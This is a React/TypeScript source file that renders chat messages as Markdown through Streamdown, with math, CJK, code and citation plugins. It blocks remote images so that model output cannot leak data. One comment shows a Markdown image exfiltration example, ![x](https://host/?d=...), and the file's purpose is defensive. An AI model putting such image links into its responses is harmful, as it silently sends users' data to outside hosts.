import { cn } from "@/frontend/lib/utils";
import { cjk } from "@streamdown/cjk";
import { createMathPlugin } from "@streamdown/math";

import type { ComponentProps, HTMLAttributes } from "react";
import { memo } from "react";
import remarkBreaks from "remark-breaks";
import {
  defaultRehypePlugins,
  Streamdown,
  type PluginConfig,
  type StreamdownProps,
} from "streamdown";
import { mdComponents } from "@/frontend/components/md-blocks";
import { lazyCodePlugin } from "@/frontend/components/lazy-code-plugin";
import { CITE_TAG, repairMathForDisplay, transformMathDelimiters, withoutCiteMarks } from "@/shared/core";

export const Message = ({ className, ...props }: HTMLAttributes<HTMLDivElement>) => (
  <div className={cn("flex w-full max-w-[95%] flex-col gap-2", className)} {...props} />
);

type MessageContentProps = HTMLAttributes<HTMLDivElement>;

export const MessageContent = ({
  children,
  className,
  ...props
}: MessageContentProps) => (
  <div
    className={cn(
      "flex w-fit min-w-0 max-w-full flex-col gap-2 overflow-hidden text-sm text-foreground",
      className
    )}
    {...props}
  >
    {children}
  </div>
);

type MessageResponseProps = ComponentProps<typeof Streamdown>;

// Type-only version skew: @streamdown/code bundles shiki@3 types while
// streamdown@2.5 expects shiki@4 types. Both work at runtime (each ships its
// own highlighter); the cast papers over the .d.ts mismatch.
//
// Standard dollar authoring: $...$ inline, $$ fenced
// on separate lines for display. transformMathDelimiters stays as the
// compatibility reader for old \(...\)/\[...\] content; its two-dollar
// output remains valid alongside native single-dollar math.
//
// remark-breaks rides in the cjk plugin's remarkPluginsAfter slot (public
// PluginConfig API): Streamdown's bare `remarkPlugins` PROP would REPLACE the
// defaults ([remark-gfm, codeMeta]), silently dropping GFM and code-fence
// metastring parsing. The slot appends after the defaults, which is the
// standard remark-gfm → remark-breaks order.
//
// SHIKI loads on the first code block (src/frontend/components/lazy-code-plugin.ts),
// so it stays out of the lesson's startup JS.
//
// MERMAID is app-owned: the md-blocks `code` override intercepts mermaid
// fences and renders via src/frontend/components/mermaid-render.ts, so no
// streamdown mermaid plugin is registered.
export const streamdownPlugins = {
  cjk: {
    ...cjk,
    remarkPluginsAfter: [...cjk.remarkPluginsAfter, remarkBreaks],
  },
  code: lazyCodePlugin,
  math: createMathPlugin({ singleDollarTextMath: true }),
} as unknown as PluginConfig;

// The source number on a mark; a module constant so Streamdown sees one identity.
const citeTags = { [CITE_TAG]: ["n"] };

// Model text must not load remote images: a rendered ![x](https://host/?d=...) sends data out
// with no click. Streamdown's default harden step allows every image prefix, so this keeps its
// raw, sanitize, harden pipeline and changes that one option; a blocked image shows as
// "[Image blocked: alt]". The app's own pictures are <img> elements, not Markdown. Streamdown
// only adds `allowedTags` to the sanitize step while it runs the default list, so a custom list
// has to add them itself.
type Schema = { tagNames?: string[]; attributes?: Record<string, unknown> };
const [sanitizePlugin, sanitizeSchema] = defaultRehypePlugins.sanitize as [unknown, Schema];
const [hardenPlugin, hardenOptions] = defaultRehypePlugins.harden as [unknown, Record<string, unknown>];

function withoutRemoteImages(tags: Record<string, string[]>): NonNullable<StreamdownProps["rehypePlugins"]> {
  const schema = { ...sanitizeSchema, tagNames: [...(sanitizeSchema.tagNames ?? []), ...Object.keys(tags)], attributes: { ...sanitizeSchema.attributes, ...tags } };
  return Object.values({
    ...defaultRehypePlugins,
    sanitize: [sanitizePlugin, schema],
    harden: [hardenPlugin, { ...hardenOptions, allowedImagePrefixes: [] }],
  }) as NonNullable<StreamdownProps["rehypePlugins"]>;
}

export const plainRehypePlugins = withoutRemoteImages({});
const messageRehypePlugins = withoutRemoteImages(citeTags);

export const MessageResponse = memo(
  ({ className, children, ...props }: MessageResponseProps) => {
    // Legacy backslash delimiters are converted in a single linear scan;
    // native dollar math passes through to Streamdown unchanged. Incomplete
    // legacy spans are left for a later render when their closer arrives.
    const content =
      typeof children === "string"
        ? transformMathDelimiters(children)
        : children;

    return (
      <Streamdown
        className={cn(
          // The reading font + emphasis-color tokens on every markdown surface.
          // Unlayered plain CSS wins over text-sm. No height: in WebKit a
          // 100% height inside a flex column row takes the whole row, and
          // a sibling under it (the Sources list) spills out.
          "lh-prose w-full [&>*:first-child]:mt-0 [&>*:last-child]:mb-0",
          className
        )}
        components={mdComponents}
        allowedTags={citeTags}
        plugins={streamdownPlugins}
        rehypePlugins={messageRehypePlugins}
        {...props}
      >
        {content}
      </Streamdown>
    );
  },
  (prevProps, nextProps) =>
    prevProps.children === nextProps.children &&
    nextProps.isAnimating === prevProps.isAnimating
);

MessageResponse.displayName = "MessageResponse";

/** Recovery is a tool-text presentation concern, not a shape/answer-data
 * transform. Ordinary assistant/user prose keeps MessageResponse unchanged. */
export function ToolContentResponse({ children, ...props }: MessageResponseProps) {
  return (
    <MessageResponse {...props}>
      {typeof children === "string" ? repairMathForDisplay(withoutCiteMarks(children)) : children}
    </MessageResponse>
  );
}

